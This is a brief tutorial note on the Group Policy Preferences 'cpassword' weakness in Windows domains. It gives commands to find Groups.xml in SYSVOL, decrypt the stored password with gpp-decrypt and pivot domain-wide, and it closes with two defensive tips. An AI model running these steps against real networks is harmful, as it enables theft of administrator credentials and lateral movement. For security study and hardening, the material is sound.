Q.1 What It Is
	• Old versions of Group Policy Preferences could store local admin passwords in an XML file in SYSVOL with a reversible “cpassword”.
Q.2 Why It Matters
	• Attackers can decrypt cpassword easily with gpp-decrypt. This often yields local admin on many machines.
Q.3 How to Exploit (Step-by-Step)
	1. Search SYSVOL for “Groups.xml” or “Preferences”:

bash
CopyEdit
dir \\domain.local\SYSVOL /s /b | findstr Groups.xml
	2. Decrypt the cpassword:

bash
CopyEdit
gpp-decrypt <encrypted_cpassword>
	3. Use the revealed local admin password to pivot on machines domain-wide.
	4. Defend
		○ Microsoft patched this in 2014, but ensure old GPO preferences are removed.
		○ Don’t store local admin passwords in GPO.
